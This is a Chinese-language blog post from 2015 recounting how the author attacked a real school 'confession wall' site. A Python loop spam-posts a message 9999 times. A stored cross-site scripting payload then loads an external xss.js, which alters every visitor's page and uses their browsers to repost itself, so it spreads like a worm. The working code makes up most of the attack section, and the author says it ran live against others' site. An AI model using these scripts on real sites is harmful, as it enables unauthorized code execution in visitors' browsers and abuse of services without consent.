---
layout: post
title: "XSS让每个人都帮我表白 (无对象技术测试)"
date: 2015-02-06 09:22
comments: true
author: MewX
published: true
categories: [life, python]
---

　　最近觉得学校的表白墙很好玩，而且人气也挺不错。有表白排行之类的有趣功能，经常能看到人刷屏、刷排行之类的。  

　　14号不就是情人节了嘛，最近肯定是表白人气最旺的时段了，妥妥地来凑个热闹。  

　　但是光是自己表白没啥意思啊，比如说我看到系统挺渣，我就用python写了个脚本一直刷，刷了9999次对吧。（下面这段代码把action地址给隐去了 =。=）  

<?prettify lang=python?>
    def tryPost( receiver, sender, msg):
        postData = 'save=1&book_title='+urllib.quote(receiver)+'&book_name='
                +urllib.quote(sender)+'&book_body='+urllib.quote(msg)
                +'&submit=%E5%8F%91%E5%B8%83';
        #print(postData);
        req = urllib2.Request(BaseURL,postData);
        req.add_header('Referer', BaseURL);
        urllib2.urlopen(req);
        return;

    for i in range(0,9999):
        tryPost('P^2','Anonymous','You know who.');

　　  

　　效果图如下，直接给刷了9999次。  
<center><a href="{{ site.cdn }}imgs/201502/01-9999-loves.jpeg" target="_blank"><img src="{{ site.cdn }}imgs/201502/01-9999-loves.jpeg" style="max-width:100%; height:auto;"/></a></center>  

　　看代码的时候应该可以看到，这表单竟然提交了一个submit元素上去，真是用(sang)心(xin)良(bing)苦(kuang)啊，为后面XSS增加了难度呢！  

　　  

　　下面来XSS。之前说了这个表白留言系统超级渣啊，没有验证码、没有XSS过滤呢。我这边可以插入任意html代码的。  

　　现在我要做到的目标就是让每个访问这个页面的人帮我向target表白！  

　　  

　　**这部分的技术难点：**  

　　1. 嵌入XSS代码；  

　　2. XSS代码长度限制在200以内；（测试发现数据库的varchar长度是200字节，html进行POST的时候会进行转义编码即“汉字”会变成“%XX%XX%XX”）  

　　3. 因为一页可能会有多遍script载入，所以在载入多遍script的时候需要保证效果只有一次，不然就直接刷屏了，太没节操了；  

　　4. POST返回值要无视掉，不然会接收到一段alert代码，影响用户体验；  

　　5. 使用jQuery在网页顶部插入表白图片，这部分用纯JS的话很麻烦，默认只能appendChild添加在末尾；  

　　6. 因为有一个元素叫submit，所以不能使用form.submit()，否则会触发object is not an method错误；

　　  

　　提交的XSS代码：  

<?prettify lang=javascript?>
    <script type="text/javascript" src="http://mewx.org/js/xss.js"></script>

　　上面这部分代码已经压缩到最短了，本来准备在前面添加一段图片的，结果直接就超长了，图片添加挪到xss.js里面了。  

　　P.S. 刚刚push上来发现自己网页被挂上那个脚本了 \_(:3」∠)\_ 好吧。最后检查时少了个问号。。  

　　  

　　XSS.JS：  

<?prettify lang=javascript?>
    // 省略 jQuery 代码

    $(document).ready(function(){

        var obj = document.getElementById("LoveX");
        if(obj) return;

        $("body:first").prepend("<img id=\"LoveX\" src=\"http://www.dwz.cn/XXXXX\" style=\"width:350px;height:350px\"/>");
        //$(".LoveX").insertAfter("header");

        // Ajax
        var params = {save:1,book_title:'此处打码',book_name:'MewX',book_body:'<script type=\"text/javascript\" src=\"http://mewx.org/js/xss.js\"></script>',submit:'发布'};
        url = 'http://xxxxxxxxx.sinaapp.com/add_express.php';
        $.post(url,params,function(data){
            // ignore data
        });
    })

　　  

　　最终效果：如图，每个访问该页面的人都会帮我提交一份表白啦！~~
<center><a href="{{ site.cdn }}imgs/201502/02-XSS-express-love.jpeg" target="_blank"><img src="{{ site.cdn }}imgs/201502/02-XSS-express-love.jpeg" style="max-width:100%; height:auto;"/></a></center>  

　　不知到2月14号会有多少访问量呢？哈哈，刚刚看到有人和我的脚本对刷！！！  

　　  

　　----------  

　　  

　　补：以上纯属闹剧，表白对象与我也毫无干系 \_(:з」∠)\_ 各位借此能了解一下XSS便好。以上恶意举动仅作技术研究。  
